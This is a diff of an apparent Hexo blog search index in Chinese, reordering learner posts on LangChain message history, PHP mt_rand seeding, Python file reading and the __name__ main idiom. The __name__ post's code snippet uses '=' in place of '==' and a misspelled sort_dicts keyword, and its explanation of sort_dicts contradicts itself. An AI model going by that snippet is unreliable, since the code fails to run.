-<li><p><strong>作为通用的消息基类</strong>：<code>BaseMessage</code>是一个基类，它定义了消息的基本结构和行为，是<code>HumanMessage</code>和<code>AIMessage</code>等具体消息类型的父类。使用<code>BaseMessage</code>作为类型提示，表示<code>messages</code>列表可以包含各种具体类型的消息对象，只要它们是<code>BaseMessage</code>的子类。这样可以实现多态性，使得代码更加灵活和可扩展。比如，后续如果需要添加其他类型的消息，如系统消息<code>SystemMessage</code>等，只要让新的消息类继承自<code>BaseMessage</code>，就可以方便地将其添加到<code>messages</code>列表中。</p>
-</li>
-<li><p><strong>统一的存储和处理</strong>：将不同类型的消息统一存储在以<code>BaseMessage</code>为类型的列表中，便于对消息进行统一的处理和操作。例如，可以遍历<code>messages</code>列表，无论其中的消息是<code>HumanMessage</code>还是<code>AIMessage</code>，都可以通过<code>BaseMessage</code>定义的公共接口来访问消息的属性和方法，如获取消息内容等。这样可以避免为不同类型的消息编写重复的处理代码，提高代码的复用性和可维护性。</p>
-</li>
-<li><p><strong>符合面向对象设计原则</strong>：遵循了面向对象编程中的里氏替换原则，即子类对象可以在不影响程序正确性的前提下，替换父类对象在程序中的位置。使用<code>BaseMessage</code>作为列表元素的类型，意味着在使用<code>messages</code>列表的地方，可以透明地处理任何<code>BaseMessage</code>子类的对象，而不需要针对具体的子类进行特殊的判断和处理，使得代码结构更加清晰，耦合度更低。</p>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>langchain</tag>
+        <tag>基本符号</tag>
       </tags>
   </entry>
   <entry>
@@ -1682,17 +1823,6 @@ int main()&#123;
       </categories>
       <tags>
         <tag>json库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux基础</title>
-    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基本符号</tag>
       </tags>
   </entry>
   <entry>
@@ -1759,6 +1889,50 @@ int main()&#123;
       </categories>
       <tags>
         <tag>numpy库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>langchain历史记录管理</title>
+    <url>/2025/02/20/langchain%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h1 id="langchain历史记录管理"><a href="#langchain历史记录管理" class="headerlink" title="langchain历史记录管理"></a>langchain历史记录管理</h1><h2 id="输入的消息类型"><a href="#输入的消息类型" class="headerlink" title="输入的消息类型:"></a>输入的消息类型:</h2><ul>
+<li><p>关于Message的基本介绍可用看这:<a href="https://python.langchain.com.cn/docs/modules/model_io/models/chat/">langchain基本Messages</a></p>
+</li>
+<li><p>这里说说基本的用法(重在区别BaseMessage,HumanMessage,AIMessage)</p>
+</li>
+<li><ul>
+<li><p>如以下代码:</p>
+</li>
+<li><pre><code class="language-python"># 先写 InMemoryMessageHistory，对获取的消息进行处理并获取历史记录列表！
+    class InMemoryMessageHistory(BaseChatMessageHistory, BaseModel):
+        messages: List[BaseMessage] = Field(default_factory=list)
+
+        # 添加并处理对话记录
+        def add_message(self, message: BaseMessage) -&gt; None:
+            self.messages.append(message)
+
+        def clear(self) -&gt; None:
+            self.messages = []
+</code></pre>
+</li>
+<li><p>这里为什么将总消息列表设置为元素均受<code>BaseMessage</code>类的列表呢?</p>
+</li>
+<li><p>原因:</p>
+</li>
+<li><p><strong>作为通用的消息基类</strong>：<code>BaseMessage</code>是一个基类，它定义了消息的基本结构和行为，是<code>HumanMessage</code>和<code>AIMessage</code>等具体消息类型的父类。使用<code>BaseMessage</code>作为类型提示，表示<code>messages</code>列表可以包含各种具体类型的消息对象，只要它们是<code>BaseMessage</code>的子类。这样可以实现多态性，使得代码更加灵活和可扩展。比如，后续如果需要添加其他类型的消息，如系统消息<code>SystemMessage</code>等，只要让新的消息类继承自<code>BaseMessage</code>，就可以方便地将其添加到<code>messages</code>列表中。</p>
+</li>
+<li><p><strong>统一的存储和处理</strong>：将不同类型的消息统一存储在以<code>BaseMessage</code>为类型的列表中，便于对消息进行统一的处理和操作。例如，可以遍历<code>messages</code>列表，无论其中的消息是<code>HumanMessage</code>还是<code>AIMessage</code>，都可以通过<code>BaseMessage</code>定义的公共接口来访问消息的属性和方法，如获取消息内容等。这样可以避免为不同类型的消息编写重复的处理代码，提高代码的复用性和可维护性。</p>
+</li>
+<li><p><strong>符合面向对象设计原则</strong>：遵循了面向对象编程中的里氏替换原则，即子类对象可以在不影响程序正确性的前提下，替换父类对象在程序中的位置。使用<code>BaseMessage</code>作为列表元素的类型，意味着在使用<code>messages</code>列表的地方，可以透明地处理任何<code>BaseMessage</code>子类的对象，而不需要针对具体的子类进行特殊的判断和处理，使得代码结构更加清晰，耦合度更低。</p>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>langchain</tag>
       </tags>
   </entry>
   <entry>
@@ -1881,6 +2055,25 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>php超全局变量</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>php随机数的解释</title>
+    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
+    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
+<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php随机数函数</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php比较字符1</title>
     <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
     <content><![CDATA[]]></content>
@@ -1905,25 +2098,6 @@ int main()&#123;
       </categories>
       <tags>
         <tag>php超全局变量</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php超全局变量</title>
-    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>php随机数的解释</title>
-    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
-    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
-<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php随机数函数</tag>
       </tags>
   </entry>
   <entry>
@@ -2125,6 +2299,76 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>python读取文件</title>
+    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
+
+<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
+<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
+<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
+<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
+<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
+<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
+<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python读取文件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>re库</title>
+    <url>/2025/03/01/re%E5%BA%93/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>python程序运行启动代码</title>
+    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
+<li><p><code>__name__</code> 变量：</p>
+</li>
+<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
+<ul>
+<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
+<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
+</ul>
+</li>
+<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
+</li>
+</ul>
+<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
+<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
+<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
+</ul>
+<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
+<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
+<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>py程序启动</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python装饰器</title>
     <url>/2025/03/20/python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
     <content><![CDATA[<h1 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul>
@@ -2161,78 +2405,8 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>python程序运行启动代码</title>
-    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
-<li><p><code>__name__</code> 变量：</p>
-</li>
-<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
-<ul>
-<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
-<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
-</ul>
-</li>
-<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
-</li>
-</ul>
-<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
-<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
-<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
-</ul>
-<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
-<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
-<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>py程序启动</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python读取文件</title>
-    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
-
-<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
-<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
-<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
-<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
-<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
-<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
-<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
-
-<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
-
-<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python读取文件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlite库学习</title>
     <url>/2025/03/05/sqlite%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>re库</title>
-    <url>/2025/03/01/re%E5%BA%93/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -2296,46 +2470,6 @@ print(year2)
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>二级好题积累:选择题</title>
-    <url>/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/</url>
